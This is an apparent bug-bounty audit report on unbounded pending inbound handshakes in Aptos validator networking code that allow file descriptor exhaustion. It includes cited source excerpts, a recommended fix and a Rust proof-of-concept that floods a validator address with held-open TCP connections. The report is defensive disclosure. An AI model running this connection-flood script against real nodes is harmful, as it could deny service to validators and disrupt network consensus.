# Audit Report

## Title
Unbounded Inbound Connection Handshakes Allow File Descriptor Exhaustion Attack on Validator Nodes

## Summary
The `AndThenStream` created in the transport layer does not inherit or enforce any connection limits on pending inbound connections. An attacker can exhaust file descriptors on validator nodes by opening thousands of TCP connections that remain in the handshake phase, preventing legitimate validator connections and disrupting consensus communication.

## Finding Description

The vulnerability exists in the network transport layer's handling of inbound connections. The attack exploits a resource management gap between TCP connection acceptance and application-level connection limiting:

**Step 1: TCP Connection Acceptance**
When a TCP connection is accepted, a file descriptor is immediately consumed. [1](#0-0) 

**Step 2: AndThenStream Wrapper (No Rate Limiting)**
The `AndThenStream` created at line 49 simply wraps the underlying listener and delegates all operations without adding any connection limits or rate limiting. [2](#0-1) 

The stream's `poll_next` implementation confirms it only forwards to the underlying stream without any limiting logic. [3](#0-2) 

**Step 3: Unbounded Pending Handshakes**
The `TransportHandler` maintains an unbounded `FuturesUnordered` for `pending_inbound_connections`. There is no limit on how many concurrent handshake upgrades can be in progress. [4](#0-3) 

Each accepted connection creates an upgrade future that is added to this unbounded collection. [5](#0-4) 

**Step 4: Late Connection Limit Enforcement**
The `inbound_connection_limit` (default 100) is only enforced AFTER the Noise handshake successfully completes in `handle_new_connection_event`. [6](#0-5) 

**The Attack:**
1. Attacker opens 10,000+ TCP connections to a validator's listening address
2. Each connection immediately consumes a file descriptor upon TCP accept
3. All connections enter the unbounded `pending_inbound_connections` queue for Noise handshake processing
4. Even with the 30-second timeout, during peak attack the file descriptor limit (typically 1024-65536) is exhausted
5. New legitimate validator connections fail with EMFILE (too many open files)
6. Consensus communication between validators is disrupted

This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." File descriptors are a critical system resource that must be protected.

## Impact Explanation

This qualifies as **High Severity** under the Aptos bug bounty program:
- **"Validator node slowdowns"**: Exhausting file descriptors causes the node to become unresponsive to new connections
- **"Significant protocol violations"**: Prevents validator connectivity, which is essential for consensus operation

If multiple validators are simultaneously attacked, this could escalate to **Critical Severity**:
- **"Total loss of liveness/network availability"**: If enough validators cannot communicate, consensus cannot proceed
- **"Non-recoverable network partition"**: Could require manual intervention to restore network connectivity

The attack is application-level resource exhaustion due to missing rate limiting, not a generic network-level DoS attack (which would be out of scope).

## Likelihood Explanation

**Likelihood: HIGH**

The attack is trivial to execute:
- Requires only the ability to open TCP connections to publicly accessible validator addresses
- No authentication required before file descriptor consumption
- Simple scripts using `socket()` and `connect()` can generate thousands of connections
- Attack can be sustained by slowly trickling new connections to replace timed-out ones

The vulnerability is currently present in the codebase as confirmed by the lack of any limit on `pending_inbound_connections` size.

## Recommendation

Implement a maximum concurrent pending handshakes limit before file descriptors are consumed. The fix should occur at the `TransportHandler` level:

**Recommended Fix:**

1. Add a configuration parameter `max_concurrent_inbound_handshakes` (e.g., 200-500, higher than `max_inbound_connections` but bounded)

2. In `TransportHandler::listen()`, track the number of pending inbound handshakes and reject new connections when the limit is reached:

```rust
// Check if we've exceeded max concurrent pending handshakes
if pending_inbound_connections.len() >= self.max_concurrent_inbound_handshakes {
    // Close the connection immediately without consuming resources
    drop(inbound_connection);
    counters::connections_rejected(&self.network_context, ConnectionOrigin::Inbound).inc();
    continue;
}
```

3. Alternatively, use a rate-limited approach similar to `FuturesUnorderedX` from the backup utilities, which provides `max_in_progress` concurrency control.

4. Consider also reducing the TCP listen backlog from 256 to a lower value (e.g., 50-100) to limit OS-level resource consumption. [7](#0-6) 

## Proof of Concept

```rust
// PoC: File Descriptor Exhaustion Attack
// Compile and run: cargo test --test fd_exhaustion_attack

use std::net::TcpStream;
use std::time::Duration;
use std::thread;

#[test]
fn test_file_descriptor_exhaustion() {
    // Target validator listening address (replace with actual address)
    let validator_addr = "127.0.0.1:6180";
    
    let mut connections = Vec::new();
    
    // Attempt to open 5000 connections
    for i in 0..5000 {
        match TcpStream::connect_timeout(
            &validator_addr.parse().unwrap(),
            Duration::from_secs(1)
        ) {
            Ok(stream) => {
                // Keep connection alive but don't complete handshake
                connections.push(stream);
                if i % 100 == 0 {
                    println!("Opened {} connections", i);
                }
            }
            Err(e) => {
                println!("Failed at connection {}: {}", i, e);
                // If we get EMFILE or similar, FD exhaustion occurred
                if e.to_string().contains("too many") || 
                   e.to_string().contains("Cannot allocate") {
                    println!("SUCCESS: File descriptor exhaustion at {} connections", i);
                    return;
                }
            }
        }
        
        // Small delay to avoid overwhelming local system
        thread::sleep(Duration::from_millis(10));
    }
    
    println!("Held {} connections without FD exhaustion", connections.len());
    
    // Keep connections open for 60 seconds to simulate sustained attack
    thread::sleep(Duration::from_secs(60));
}
```

**Expected Result:** The validator node will exhaust file descriptors and fail to accept new connections, while legitimate validators attempting to connect will receive connection failures. The `pending_connection_upgrades` metric will show a large number of pending handshakes, and `connections_rejected` will not increment because rejection happens too late (after handshake completion).

## Notes

The 30-second `TRANSPORT_TIMEOUT` provides some mitigation by eventually freeing file descriptors, but during an active attack where the attacker continuously opens new connections, the sustained rate can still exhaust resources. The fundamental issue is the lack of any limit on concurrent pending handshakes before file descriptor consumption occurs.

### Citations

**File:** network/netcore/src/transport/tcp.rs (L127-127)
```rust
        let listener = socket.listen(256)?;
```

**File:** network/netcore/src/transport/tcp.rs (L319-334)
```rust
    fn poll_next(self: Pin<&mut Self>, context: &mut Context) -> Poll<Option<Self::Item>> {
        match self.inner.poll_accept(context) {
            Poll::Ready(Ok((socket, addr))) => {
                if let Err(e) = self.config.apply_config(&socket) {
                    return Poll::Ready(Some(Err(e)));
                }
                let dialer_addr = NetworkAddress::from(addr);
                Poll::Ready(Some(Ok((
                    future::ready(Ok(TcpSocket::new(socket))),
                    dialer_addr,
                ))))
            },
            Poll::Ready(Err(e)) => Poll::Ready(Some(Err(e))),
            Poll::Pending => Poll::Pending,
        }
    }
```

**File:** network/netcore/src/transport/and_then.rs (L43-51)
```rust
    fn listen_on(
        &self,
        addr: NetworkAddress,
    ) -> Result<(Self::Listener, NetworkAddress), Self::Error> {
        let (listener, addr) = self.transport.listen_on(addr)?;
        let listener = AndThenStream::new(listener, self.function.clone());

        Ok((listener, addr))
    }
```

**File:** network/netcore/src/transport/and_then.rs (L95-110)
```rust
    fn poll_next(mut self: Pin<&mut Self>, context: &mut Context) -> Poll<Option<Self::Item>> {
        match self.as_mut().project().stream.poll_next(context) {
            Poll::Pending => Poll::Pending,
            Poll::Ready(None) => Poll::Ready(None),
            Poll::Ready(Some(Err(e))) => Poll::Ready(Some(Err(e))),
            Poll::Ready(Some(Ok((fut1, addr)))) => Poll::Ready(Some(Ok((
                AndThenFuture::new(
                    fut1,
                    self.f.clone(),
                    addr.clone(),
                    ConnectionOrigin::Inbound,
                ),
                addr,
            )))),
        }
    }
```

**File:** network/framework/src/peer_manager/transport.rs (L90-109)
```rust
    pub async fn listen(mut self) {
        let mut pending_inbound_connections = FuturesUnordered::new();
        let mut pending_outbound_connections = FuturesUnordered::new();

        debug!(
            NetworkSchema::new(&self.network_context),
            "{} Incoming connections listener Task started", self.network_context
        );

        loop {
            futures::select! {
                dial_request = self.transport_reqs_rx.select_next_some() => {
                    if let Some(fut) = self.dial_peer(dial_request) {
                        pending_outbound_connections.push(fut);
                    }
                },
                inbound_connection = self.listener.select_next_some() => {
                    if let Some(fut) = self.upgrade_inbound_connection(inbound_connection) {
                        pending_inbound_connections.push(fut);
                    }
```

**File:** network/framework/src/peer_manager/transport.rs (L127-167)
```rust
    /// Make an inbound request upgrade future e.g. Noise handshakes
    fn upgrade_inbound_connection(
        &self,
        incoming_connection: Result<(TTransport::Inbound, NetworkAddress), TTransport::Error>,
    ) -> Option<
        BoxFuture<
            'static,
            (
                Result<Connection<TSocket>, TTransport::Error>,
                NetworkAddress,
                Instant,
            ),
        >,
    > {
        match incoming_connection {
            Ok((upgrade, addr)) => {
                debug!(
                    NetworkSchema::new(&self.network_context).network_address(&addr),
                    "{} Incoming connection from {}", self.network_context, addr
                );

                counters::pending_connection_upgrades(
                    &self.network_context,
                    ConnectionOrigin::Inbound,
                )
                .inc();

                let start_time = self.time_service.now();
                Some(upgrade.map(move |out| (out, addr, start_time)).boxed())
            },
            Err(e) => {
                info!(
                    NetworkSchema::new(&self.network_context),
                    error = %e,
                    "{} Incoming connection error {}",
                    self.network_context,
                    e
                );
                None
            },
        }
```

**File:** network/framework/src/peer_manager/mod.rs (L351-388)
```rust
        // Verify that we have not reached the max connection limit for unknown inbound peers
        if conn.metadata.origin == ConnectionOrigin::Inbound {
            // Everything below here is meant for unknown peers only. The role comes from
            // the Noise handshake and if it's not `Unknown` then it is trusted.
            if conn.metadata.role == PeerRole::Unknown {
                // TODO: Keep track of somewhere else to not take this hit in case of DDoS
                // Count unknown inbound connections
                let unknown_inbound_conns = self
                    .active_peers
                    .iter()
                    .filter(|(peer_id, (metadata, _))| {
                        metadata.origin == ConnectionOrigin::Inbound
                            && trusted_peers
                                .get(peer_id)
                                .is_none_or(|peer| peer.role == PeerRole::Unknown)
                    })
                    .count();

                // Reject excessive inbound connections made by unknown peers
                // We control outbound connections with Connectivity manager before we even send them
                // and we must allow connections that already exist to pass through tie breaking.
                if !self
                    .active_peers
                    .contains_key(&conn.metadata.remote_peer_id)
                    && unknown_inbound_conns + 1 > self.inbound_connection_limit
                {
                    info!(
                        NetworkSchema::new(&self.network_context)
                            .connection_metadata_with_address(&conn.metadata),
                        "{} Connection rejected due to connection limit: {}",
                        self.network_context,
                        conn.metadata
                    );
                    counters::connections_rejected(&self.network_context, conn.metadata.origin)
                        .inc();
                    self.disconnect(conn);
                    return;
                }
```
